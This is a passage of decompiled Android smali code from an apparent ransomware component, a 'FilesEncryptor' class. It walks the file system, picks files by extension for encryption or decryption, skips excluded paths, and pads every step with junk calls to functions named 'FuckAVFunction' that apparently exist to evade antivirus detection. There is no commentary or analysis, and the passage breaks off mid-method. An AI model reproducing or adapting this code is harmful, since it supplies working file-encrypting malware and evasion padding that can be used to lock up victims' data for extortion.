
    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "tdAhlG"

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 394
    sget-object v0, Lcom/androidl/mqmgr/Constants;->ENCODED_FILE_EXTENSION:Ljava/lang/String;

    invoke-virtual {v7, v0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_0

    .line 395
    const v0, 0x18dbd0eb

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x340234fc

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "NsVFTuLk"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 396
    const v0, 0x371e7ad4

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x1b1f8f00

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x2cdbb5f3

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 397
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "vnrfKOp"

    const v2, 0x3268e511

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 398
    iget-object v0, p0, Lcom/androidl/mqmgr/FilesEncryptor;->filesToDecrypt:Ljava/util/ArrayList;

    invoke-virtual {v0, v11}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 399
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "kgHgm"

    const v2, 0x4d13619

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 402
    :cond_0
    sget-object v0, Lcom/androidl/mqmgr/Constants;->EXTENSIONS_TO_ENCRYPT:Ljava/util/List;

    invoke-interface {v0, v7}, Ljava/util/List;->contains(Ljava/lang/Object;)Z

    move-result v0

    if-eqz v0, :cond_1

    invoke-direct {p0, v11}, Lcom/androidl/mqmgr/FilesEncryptor;->verifyPath(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 403
    const-string v0, "QApfGlfOl"

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x16df51ad

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x216eebe4

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "HoqFkP"

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 404
    const-string v0, "Puoigkai"

    const v1, 0xd1e77db

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "PigJis"

    const-string v3, "dlfrAM"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction5(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 405
    const-string v0, "gggPJT"

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x3182dc44

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const/4 v3, 0x0

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0xf269b4d

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "CtGrGAr"

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 406
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x278b8719

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "DFsTg"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0xae6d52f

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 407
    iget-object v0, p0, Lcom/androidl/mqmgr/FilesEncryptor;->filesToEncrypt:Ljava/util/ArrayList;

    invoke-virtual {v0, v11}, Ljava/util/ArrayList;->add(Ljava/lang/Object;)Z

    .line 408
    const-string v0, "JgDVPTe"

    const v1, 0x1aae676f

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "iRcgPBcwe"

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 409
    const v0, 0x2a18d80f

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0xf3ed21f

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "ElGndd"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 358
    .end local v7    # "extension":Ljava/lang/String;
    :cond_1
    :goto_3
    add-int/lit8 v8, v8, 0x1

    goto/16 :goto_0

    .line 390
    .restart local v7    # "extension":Ljava/lang/String;
    :cond_2
    const/4 v0, 0x0

    goto/16 :goto_1

    :cond_3
    const/4 v1, 0x0

    goto/16 :goto_2

    .line 415
    .end local v7    # "extension":Ljava/lang/String;
    :cond_4
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x0

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2df4806f

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "eisBggecR"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0x36a30a8

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 416
    const v0, 0x18df8a95

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x1b2c98d4

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x1

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x1f946ad7

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x0

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    const/4 v6, 0x0

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 418
    invoke-virtual {v12}, Ljava/io/File;->listFiles()[Ljava/io/File;

    move-result-object v0

    if-eqz v0, :cond_1

    invoke-direct {p0, v11}, Lcom/androidl/mqmgr/FilesEncryptor;->verifyPath(Ljava/lang/String;)Ljava/lang/Boolean;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/Boolean;->booleanValue()Z

    move-result v0

    if-eqz v0, :cond_1

    .line 419
    const v0, 0xd0e2b93

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x2bcc3ba1

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const/4 v2, 0x0

    invoke-static {v2}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0xa5aab8c

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const/4 v5, 0x1

    invoke-static {v5}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    const/4 v6, 0x1

    invoke-static {v6}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction10(Ljava/lang/Integer;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 420
    const/4 v0, 0x1

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0xf51e9a8

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "TDVNLB"

    const/4 v4, 0x0

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0x3afecb49

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 421
    const-string v0, "vGCtGWl"

    const-string v1, "iwPawi"

    const v2, 0x2aeadae9

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 422
    invoke-direct {p0, v12}, Lcom/androidl/mqmgr/FilesEncryptor;->getFileNames(Ljava/io/File;)V

    .line 423
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "WWMjlAh"

    const/4 v3, 0x1

    invoke-static {v3}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction2(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 424
    const/4 v0, 0x0

    invoke-static {v0}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const/4 v1, 0x1

    invoke-static {v1}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x2734ea64

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "PoLeTikq"

    const/4 v4, 0x1

    invoke-static {v4}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const v5, 0x7c22d98

    invoke-static {v5}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction7(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;)Ljava/lang/Integer;

    goto/16 :goto_3

    .line 428
    .end local v11    # "path":Ljava/lang/String;
    .end local v12    # "tempFile":Ljava/io/File;
    :cond_5
    return-void
.end method

.method private verifyPath(Ljava/lang/String;)Ljava/lang/Boolean;
    .locals 10
    .param p1, "path"    # Ljava/lang/String;

    .prologue
    const/4 v9, 0x1

    const/4 v8, 0x0

    .line 431
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x1dc3b128

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "jdCSlj"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "htKCdWQn"

    const-string v5, "BRmsRqkP"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 432
    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "AfKjnt"

    const v3, 0x25193835

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "NHiLkwcT"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 433
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const v1, 0x130aa56c

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    const-string v2, "owPPDa"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "iLLkRcF"

    const-string v5, "EMCQrCQ"

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction6(Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    .line 435
    sget-object v0, Lcom/androidl/mqmgr/Constants;->BAD_FILENAMES:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-lez v0, :cond_1

    .line 436
    const v0, 0x402ece9

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x7dd2faa

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "UfQjt"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 437
    const-string v0, "RqssBio"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x368da91c

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0xbde8fe5

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "hQdIQKjE"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 438
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "UQAlSKn"

    const v3, 0x3b4d063f

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "NiNNaDgwcV"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 439
    const/4 v7, 0x0

    .local v7, "i":I
    :goto_0
    sget-object v0, Lcom/androidl/mqmgr/Constants;->BAD_FILENAMES:Ljava/util/List;

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v0

    if-ge v7, v0, :cond_1

    .line 440
    const-string v0, "rjQQKS"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0x22d0d20b

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const v4, 0x1309b702

    invoke-static {v4}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v4

    const-string v5, "JRaJc"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction8(Ljava/lang/String;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 441
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    const-string v1, "ItWIjEtfA"

    const v2, 0x12c7203f

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction12(Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 442
    const v0, 0x117de81f

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const v2, 0xe3a84cc

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    const-string v3, "LkeeVLq"

    invoke-static {v0, v1, v2, v3}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction3(Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Integer;Ljava/lang/String;)Ljava/lang/String;

    .line 443
    const-string v0, "OQdSSd"

    const v1, 0x237bb76b

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v3

    const-string v4, "UnGpQv"

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v5

    invoke-static/range {v0 .. v5}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction4(Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 444
    sget-object v0, Lcom/androidl/mqmgr/Constants;->BAD_FILENAMES:Ljava/util/List;

    invoke-interface {v0, v7}, Ljava/util/List;->get(I)Ljava/lang/Object;

    move-result-object v0

    check-cast v0, Ljava/lang/String;

    invoke-virtual {p1, v0}, Ljava/lang/String;->indexOf(Ljava/lang/String;)I

    move-result v0

    const/4 v1, -0x1

    if-eq v0, v1, :cond_0

    .line 445
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "HouPgNF"

    const v3, 0x32748944

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "lSfGtE"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 446
    invoke-static {v8}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v0

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v1

    const-string v2, "KWKlMIM"

    const v3, 0x2bf789fc

    invoke-static {v3}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v3

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v4

    const-string v5, "DBuqgaNiHs"

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v6

    invoke-static/range {v0 .. v6}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction9(Ljava/lang/Boolean;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Integer;Ljava/lang/Boolean;Ljava/lang/String;Ljava/lang/Boolean;)Ljava/lang/Boolean;

    .line 447
    const-string v0, "cJomRBoTm"

    const-string v1, "CrnKEC"

    const v2, 0x1bccc869

    invoke-static {v2}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    invoke-static {v0, v1, v2}, Lcom/androidl/mqmgr/FilesEncryptor;->FuckAVFunction0(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Integer;)Ljava/lang/Integer;

    .line 448
    const v0, 0x116f0177

    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    const v1, 0x1e39f804

    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    invoke-static {v9}, Ljava/lang/Boolean;->valueOf(Z)Ljava/lang/Boolean;

    move-result-object v2

    const v3, 0x2cbb1d62

